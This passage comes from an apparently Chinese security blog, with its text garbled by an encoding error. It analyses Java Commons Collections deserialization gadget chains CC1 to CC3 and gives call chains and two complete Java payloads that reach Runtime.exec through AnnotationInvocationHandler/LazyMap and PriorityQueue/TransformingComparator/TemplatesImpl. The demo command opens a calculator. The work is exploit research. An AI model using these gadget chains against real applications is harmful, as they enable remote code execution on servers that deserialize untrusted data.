class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field f = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ChainedTransformer <span class="title">getTransformerChain</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        Transformer[] tfs = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> String[]&#123;cmd&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ChainedTransformer(tfs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Class aih = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor aihC = aih.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihC.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç”Ÿæˆæœ‰å…³Transformerçš„payload</span></span><br><span class="line">        Map map = LazyMap.decorate(<span class="keyword">new</span> HashMap(), getTransformerChain(<span class="string">&quot;calc&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç¬¬ä¸€ä¸ªAnnotationInvocationHandlerä½œä¸ºä»£ç†</span></span><br><span class="line">        InvocationHandler aihC1 = (InvocationHandler) aihC.newInstance(Documented.class, map);</span><br><span class="line">        Map proxy = (Map) Proxy.newProxyInstance(aih.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Map.class&#125;, aihC1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä½¿ç”¨Collections$SetFromMapä½œä¸ºè½½ä½“</span></span><br><span class="line">        Class cs = Class.forName(<span class="string">&quot;java.util.Collections$SetFromMap&quot;</span>);</span><br><span class="line">        Constructor csC = cs.getDeclaredConstructor(Map.class);</span><br><span class="line">        csC.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object o = csC.newInstance(<span class="keyword">new</span> HashMap());</span><br><span class="line">        setFieldValue(o,<span class="string">&quot;m&quot;</span>,proxy);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ååºåˆ—åŒ–æµ‹è¯•</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œç»“æœğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151239158.png" alt="image-20220215123914958"></p>
<h3 id="CC2"><a href="#CC2" class="headerlink" title="- CC2 -"></a>- CC2 -</h3><p>å®éªŒç¯å¢ƒï¼š</p>
<ul>
<li><code>jdk1.7.0_02</code></li>
<li><code>commons.collections 4.0</code></li>
</ul>
<h4 id="è°ƒç”¨ç»“æ„-1"><a href="#è°ƒç”¨ç»“æ„-1" class="headerlink" title="- è°ƒç”¨ç»“æ„ -"></a>- è°ƒç”¨ç»“æ„ -</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PriorityQueue.readObject()</span><br><span class="line">	ğŸ‘‡</span><br><span class="line">	PriorityQueue.heapify()</span><br><span class="line">	ğŸ‘‡</span><br><span class="line">	PriorityQueue.siftDown()</span><br><span class="line">    ğŸ‘‡</span><br><span class="line">    PriorityQueue.siftDownUsingComparator()</span><br><span class="line">		ğŸ‘‡</span><br><span class="line">		TransformingComparator.compare()</span><br><span class="line">			ğŸ‘‡</span><br><span class="line">			InvokerTransformer.transform() =&gt; TemplatesImpl.newTransformer()</span><br><span class="line">			ğŸ‘‡</span><br><span class="line">			TemplatesImpl.newTransformer()</span><br><span class="line">            ğŸ‘‡</span><br><span class="line">            TemplatesImpl.getTransletInstance()</span><br><span class="line">            ğŸ‘‡</span><br><span class="line">            TemplatesImpl.defineTransletClasses()</span><br><span class="line">            ğŸ‘‡</span><br><span class="line">            newInstance()</span><br><span class="line">		</span><br></pre></td></tr></table></figure>
<h4 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="- åˆ†æ -"></a>- åˆ†æ -</h4><p>ä»ä¸Šé¢çš„ <code>è°ƒç”¨ç»“æ„</code> å¯ä»¥çœ‹å‡ºï¼Œæœ€åæ‰§è¡Œçš„æ ¸å¿ƒéƒ¨åˆ†æ˜¯è°ƒç”¨äº†æœ‰å…³ <code>TemplatesImpl</code> çš„ <code>payload</code> ï¼›è€Œè°ƒç”¨è¿™ä¸ª <code>payload</code> çš„å…³é”®æ˜¯èƒ½å¤Ÿè°ƒç”¨åˆ° <code>TemplatesImpl</code> ç±»ä¸­çš„ <code>newTransformer</code> æ–¹æ³•ï¼Œäºæ˜¯ä¹Ÿå°±ä½¿ç”¨äº† <code>InvokerTransformer</code> ç±»ä¸­å¯å¯¹ <code>ä»»æ„ç±»</code>  çš„ <code>ä»»æ„æ–¹æ³•</code> ä¼ å…¥ <code>ä»»æ„å‚æ•°</code> çš„è°ƒç”¨åŠŸèƒ½ã€‚å½“ç„¶ï¼Œæ­¤æ—¶è¿˜å¿…é¡»å¾—æ‰¾ä¸€ä¸ªå½¢å¦‚ <code>[å¯æ§].transform()</code> ç»“æ„ä»¥ä¾¿è°ƒç”¨  <code>InvokerTransformer</code> ç±»çš„ <code>transform</code> æ–¹æ³•ã€‚</p>
<p>é‚£ä¹ˆè·Ÿè¿› <code>TransformingComparator</code> ç±»ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150859741.png" alt="image-20220215085904529"></p>
<p>å¯è§åœ¨å…¶ <code>compare</code> æ–¹æ³•ä¸­å­˜åœ¨ <code>[å¯æ§].transform()</code> çš„ç»“æ„ï¼ŒåŒæ—¶ <code>transformer</code> å±æ€§å¯æ§å¹¶ä¸”å¯åºåˆ—åŒ–(åœ¨ <code>commons.collections3</code> ä¸­ <code>TransformingComparator</code> ç±»ä¸æ”¯æŒåºåˆ—åŒ–)ã€‚</p>
<p>ç”±æ­¤ç°åœ¨çš„å…³æ³¨ç‚¹å°±æ¥åˆ°äº†å¦‚ä½•è°ƒç”¨ <code>TransformingComparator</code> ç±»çš„ <code>compare</code> æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿› <code>PriorityQueue</code> ç±»çš„ <code>siftDownUsingComparator</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150904036.png" alt="image-20220215090423964"></p>
<p>æ˜¯å­˜åœ¨å¯¹ <code>compare</code> æ–¹æ³•çš„è°ƒç”¨çš„ï¼Œå†çœ‹ <code>comparator</code> å±æ€§ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150905767.png" alt="image-20220215090524681"></p>
<p>ä¾æ—§æ˜¯å¯æ§ä¸”å¯åºåˆ—åŒ–çš„ï¼Œå¹¶ä¸”è¿™ä¸ª <code>comparator</code> å±æ€§çš„ç±»å‹ä¸º <code>Comparator</code> ï¼Œä¸Šé¢çš„ <code>TransformingComparator</code> ç±»å®ç°äº† <code>Comparator</code> çš„æ¥å£ï¼Œä¹Ÿå°±å¯ä»¥èµ‹å€¼ä¸º <code>TransformingComparator</code> ï¼Œè‡³æ­¤ <code>TransformingComparator.compare</code> æ–¹æ³•å°±æœ‰æœºä¼šè¢«è°ƒç”¨ã€‚</p>
<p>æ¥ä¸‹æ¥çš„ç›®æ ‡ä¹Ÿå°±æ˜¯å¾—åˆ°è¾¾ <code>PriorityQueue</code> ç±»çš„ <code>siftDownUsingComparator</code> æ–¹æ³•ï¼Œä»å¤´æ¥çœ‹ <code>PriorityQueue</code> ç±»çš„ <code>readObject</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150909930.png" alt="image-20220215090902850"></p>
<p>è¿™é‡Œåœ¨ç»™ <code>queue</code> å±æ€§è¯»å–ç›¸å…³åºåˆ—åŒ–å€¼åï¼Œè°ƒç”¨äº† <code>heapify</code> æ–¹æ³•ï¼Œè·Ÿè¿› <code>heapify</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150910840.png" alt="image-20220215091015800"> </p>
<p>å¦‚æœè¦å¾€ä¸‹æ‰§è¡Œå°±å¿…é¡»è°ƒç”¨ <code>siftDown</code> æ–¹æ³•ï¼Œé‚£ä¹ˆ <code>size</code> å±æ€§çš„å€¼å¿…é¡»è‡³å°‘ä¸º <code>2</code> ï¼ŒåŒæ—¶æ³¨æ„è¿™é‡Œä¼ å…¥ <code>siftDown</code> æ–¹æ³•çš„å‚æ•°å†…å®¹ä¸º <code>queue</code> å±æ€§çš„å†…å®¹ï¼Œå†è·Ÿè¿› <code>siftDown</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150912729.png" alt="image-20220215091202681"></p>
<p>åœ¨ä¸Šé¢å·²ç»è¯´æ˜ <code>comparator</code> å·²è¢«èµ‹å€¼ä¸º <code>TransformingComparator</code> ç±»ï¼Œæ­¤æ—¶ä¹Ÿå°±ä¼šè°ƒç”¨ <code>siftDownUsingComparator</code> æ–¹æ³•ï¼Œè€Œä¼ å…¥çš„å‚æ•°ä¸º <code>heapify</code> æ–¹æ³•ä¸­å¾ªç¯çš„æ•´å‹ <code>i</code> ä»¥åŠ <code>queue[i]</code> çš„å€¼ã€‚</p>
<p>æœ€åå†è·Ÿè¿› <code>siftDownUsingComparator</code> æ–¹æ³•ï¼Œçœ‹å¦‚ä½•åˆ°è¾¾ <code>comparator</code> å±æ€§çš„ <code>compare</code> æ–¹æ³•è°ƒç”¨ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150917471.png" alt="image-20220215091759402"></p>
<p>æ­¤æ—¶å‡è‹¥é€šè¿‡åºåˆ—åŒ–æ§åˆ¶ <code>size</code> å±æ€§çš„å€¼ä¸º <code>2</code> ï¼Œç¬¬ä¸€éä¼ å…¥çš„å‚æ•°ä¹Ÿå°±ä¸ºğŸ‘‡</p>
<ul>
<li><code>k = 0</code></li>
<li><code>x = queue[0]</code></li>
</ul>
<p>å…¶ä¸­ <code>half = 1</code> ï¼Œç”±äº <code>k = 0</code> ï¼Œé‚£ä¹ˆ <code>k &lt; half</code> å¿…ç„¶æˆç«‹ã€‚</p>
<p>è·Ÿè¿›å¾ªç¯å†…å®¹ï¼Œçœ‹åˆ° <code>child = 1</code> ï¼Œ<code>c = queue[1]</code> ï¼Œè€Œ <code>right = 2</code> ï¼Œæ˜¾ç„¶ç¬¬ä¸€ä¸ªæ¡ä»¶ä¹Ÿå°±æ˜¯ <code>if (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; 0)</code> ä¸­æ˜¯ä¸æˆç«‹çš„(å› ä¸º <code>right = size = 2</code> )ï¼›åœ¨ç¬¬äºŒä¸ªæ¡ä»¶ä¸­ç›´æ¥ä»¥ <code>x = queue[0]</code> å’Œ <code>c = queue[1]</code> ä½œä¸ºå‚æ•°è°ƒç”¨äº† <code>comparator.compare</code> ï¼Œè‡³æ­¤å°±è¾¾æˆäº†ç›®çš„ã€‚</p>
<p>å†æ¥çœ‹ <code>writeObject</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150929318.png" alt="image-20220215092906254"></p>
<p>å¯è§ <code>queue</code> å±æ€§æ˜¯ç›´æ¥å†™è¿›å»äº†ï¼Œå¹¶ä¸”ç”±äº <code>queue</code> å±æ€§ç±»å‹ä¸º <code>Object[]</code> ï¼Œä¹Ÿå°±å¯ä»¥èµ‹äºˆä»»æ„å€¼ï¼Œæ¯”å¦‚ <code>InvokerTransformer</code> ç±»æ˜¯å¯ä»¥çš„ã€‚</p>
<h4 id="payload-3"><a href="#payload-3" class="headerlink" title="- payload -"></a>- payload -</h4><p>éœ€è¦æ³¨æ„çš„æ˜¯é™¤äº†éœ€è¦ <code>commons.collections4.0</code> ç‰ˆæœ¬å¤–ï¼Œåªè¦æŒ‰ç…§ä»¥ä¸‹ç»“æ„æ„é€  <code>PriorityQueue</code> ç±»å°±å¥½äº†ğŸ‘‡</p>
<ul>
<li><code>size = 2</code></li>
<li><code>comparator = TransformingComparatorç±»</code></li>
<li><code>queue[2] = &#123;InvokerTransformerç±», null&#125;</code></li>
</ul>
<p>åœ¨ <code>PriorityQueue</code> çš„æ„é€ æ–¹æ³•ä¸­ä»…ä»…æ˜¯æä¾›äº†æœ‰å…³ <code>queue</code> é•¿åº¦ä»¥åŠ <code>comparator</code> çš„æ„é€ ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150932390.png" alt="image-20220215093250330"></p>
<p>å› æ­¤éœ€è¦åœ¨åå°„ä¸­æ„é€  <code>queue</code> å’Œ <code>size</code> çš„å±æ€§å€¼ï¼Œå½“ç„¶é€šè¿‡ <code>add</code> æ–¹æ³•åŠ ä¸¤ä¸ªå€¼ä¹Ÿå¯ä»¥ï¼Œä¸è¿‡ç”±äº <code>add</code> æ–¹æ³•ä¼šç”± <code>add()</code>-&gt;<code>offer()</code>-&gt;<code>siftUp()</code>-&gt;<code>siftUp()</code>-&gt;<code>siftUpUsingComparator()</code>-&gt;<code>comparator.compare()</code> æœ€ç»ˆåœ¨æœ¬åœ°æ‰§è¡Œ <code>payload</code> ï¼Œéœ€è¦åœ¨è¿›è¡Œ <code>add</code> æ–¹æ³•è°ƒç”¨åå†é€šè¿‡åå°„ç»™ <code>comparator</code> å±æ€§èµ‹å€¼ï¼Œè¿™é‡Œå°±ç›´æ¥ç”¨åå°„è®¾ç½® <code>size</code> çš„å€¼äº†ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field f = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title">getTemplatesImpl</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        CtClass[] cs = <span class="keyword">new</span> CtClass[]&#123;</span><br><span class="line">                pool.makeClass(<span class="string">&quot;a&quot;</span> + System.nanoTime()),</span><br><span class="line">                pool.makeClass(<span class="string">&quot;b&quot;</span> + System.nanoTime())</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        cs[<span class="number">0</span>].makeClassInitializer().insertBefore(cmd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[][] bc = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;</span><br><span class="line">                cs[<span class="number">0</span>].toBytecode(),</span><br><span class="line">                cs[<span class="number">1</span>].toBytecode()</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å®ä¾‹åŒ–templateså¹¶é€šè¿‡åå°„èµ‹å€¼</span></span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bc);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;dqv5&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_transletIndex&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ„é€ TransformingComparator</span></span><br><span class="line">        InvokerTransformer itf = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> Class[]&#123;&#125;, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">        TransformingComparator tc = <span class="keyword">new</span> TransformingComparator(itf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ„é€ PriorityQueue</span></span><br><span class="line">        PriorityQueue pq = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>, tc);</span><br><span class="line"></span><br><span class="line">        setFieldValue(pq, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        setFieldValue(pq, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> Object[]&#123;getTemplatesImpl(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;).waitFor();&quot;</span>), <span class="keyword">null</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ååºåˆ—åŒ–æµ‹è¯•</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(pq);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œç»“æœğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150954323.png" alt="image-20220215095421119"></p>
<p>æ˜¯æˆåŠŸäº†ã€‚</p>
<h3 id="CC3"><a href="#CC3" class="headerlink" title="- CC3 -"></a>- CC3 -</h3><p>å®éªŒç¯å¢ƒï¼š</p>
<ul>
<li><code>jdk1.7.0_02</code></li>
<li><code>commons.collections 3.2.0</code></li>
</ul>
<h4 id="è°ƒç”¨ç»“æ„-2"><a href="#è°ƒç”¨ç»“æ„-2" class="headerlink" title="- è°ƒç”¨ç»“æ„ -"></a>- è°ƒç”¨ç»“æ„ -</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">	ğŸ‘‡</span><br><span class="line">	(Map)Proxy.entrySet()</span><br><span class="line">	ğŸ‘‡</span><br><span class="line">	(Map)Proxy.invoke() &lt;=&gt; AnnotationInvocationHandler.invoke()</span><br><span class="line">		ğŸ‘‡</span><br><span class="line">		LazyMap.get()</span><br><span class="line">		ğŸ‘‡</span><br><span class="line">		ChainedTransformer.transform()</span><br><span class="line">		ğŸ‘‡</span><br><span class="line">		ConstantTransformer.transform() =&gt; InstantiateTransformer</span><br><span class="line">        ğŸ‘‡</span><br><span class="line">        InstantiateTransformer.transform() =&gt; TrAXFilter.TrAXFilter()</span><br><span class="line">        	ğŸ‘‡</span><br><span class="line">        	TrAXFilter.TrAXFilter()</span><br><span class="line">        	ğŸ‘‡</span><br><span class="line">			TemplatesImpl.newTransformer()</span><br><span class="line">            ğŸ‘‡</span><br><span class="line">            TemplatesImpl.getTransletInstance()</span><br><span class="line">            ğŸ‘‡</span><br><span class="line">            TemplatesImpl.defineTransletClasses()</span><br><span class="line">            ğŸ‘‡</span><br><span class="line">            newInstance()</span><br><span class="line">        </span><br></pre></td></tr></table></figure>
<h4 id="åˆ†æ-4"><a href="#åˆ†æ-4" class="headerlink" title="- åˆ†æ -"></a>- åˆ†æ -</h4><p>å¯ä»¥çœ‹åˆ°ååŠæ®µä¸º <code>TemplatesImpl</code> çš„ <code>payload</code> ï¼Œå‰åŠæ®µå’Œ <code>CC1</code> é“¾æ¡çš„å‰åŠæ®µç›¸ä¼¼ï¼Œä¸»è¦åŒºåˆ«æ˜¯ä¸­æ®µå¤šå‡ºäº†å¯¹ <code>InstantiateTransformer</code>  ç±»çš„ <code>transform</code> æ–¹æ³•è°ƒç”¨å’Œç”± <code>TrAXFilter</code> ç±»çš„æ„é€ æ–¹æ³•åˆ°è¾¾ <code>TemplatesImpl</code> ç±»çš„ <code>newTransformer</code> æ–¹æ³•ã€‚</p>
<p>å…ˆæ¥çœ‹ <code>InstantiateTransformer</code> ç±»çš„ <code>transform</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151043797.png" alt="image-20220215104326719"></p>
<p>å¯ä»¥ç”¨æ¥å°†ä¸€ä¸ªæ‹¥æœ‰å…¬æœ‰æ„é€ æ–¹æ³•çš„ç±»å®ä¾‹åŒ–ï¼Œä¼ å…¥çš„å‚æ•°æ˜¯å¯æ§ä¸”å¯åºåˆ—åŒ–çš„ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151045763.png" alt="image-20220215104527715"></p>
<p>å†æ¥åˆ° <code>TrAXFilter</code> ç±»çš„æ„é€ æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151047868.png" alt="image-20220215104703802"></p>
<p>åœ¨è¿™é‡Œå°†ä¼ å…¥çš„ <code>templates</code> å‚æ•°ç±»å‹ä¸º <code>Templates</code> æ¥å£ï¼Œç„¶åè°ƒç”¨äº† <code>templates</code> å‚æ•°çš„ <code>newTransformer</code> æ–¹æ³•ï¼›è€Œ <code>TemplatesImpl</code> è¿™ä¸ª <code>payload</code> çš„å…³é”®æ­£å¥½æ˜¯éœ€è¦å¯¹å…¶ <code>newTransformer</code> æ–¹æ³•çš„è°ƒç”¨ï¼Œå¹¶ä¸” <code>TemplatesImpl</code> ç±»ä¹Ÿæ˜¯å®ç°äº† <code>Templates</code> æ¥å£çš„ã€‚</p>
<p>å› æ­¤å°±å¯ä»¥é€šè¿‡è¿™ä¸ª <code>[(Templates)å¯æ§].newTransformer()</code> çš„è°ƒç”¨è¾¾æˆ <code>TemplatesImpl</code> çš„ <code>payload</code> äº†ã€‚</p>
<h4 id="payload-4"><a href="#payload-4" class="headerlink" title="- payload -"></a>- payload -</h4><p>ç”±äºè¿™æ¡é“¾å‰åŠæ®µå’Œ <code>CC1</code> é“¾çš„å‰åŠæ®µç›¸ä¼¼ï¼Œå°±ä¸åšåˆ†æï¼Œä¸­æ®µåªéœ€è¦å°†å¯¹ <code>InstantiateTransformer</code> ç±»çš„ <code>tranform</code> æ–¹æ³•è°ƒç”¨çš„å‚æ•°è®¾ä¸º <code>TrAXFilter</code> ç±»ã€å¹¶å°† <code>InstantiateTransformer</code> ç±»çš„ <code>iParamTypes</code> å’Œ <code>iArgs</code> å±æ€§æ„é€ å¥½ï¼Œæ¥ä¸Š <code>TrAXFilter</code> ç±»æ„é€ æ–¹æ³•çš„å‚æ•°ç±»å‹ä»¥åŠ <code>TemplatesImpl</code> ç±»çš„ <code>payload</code> å³å¯ğŸ‘‡</p>
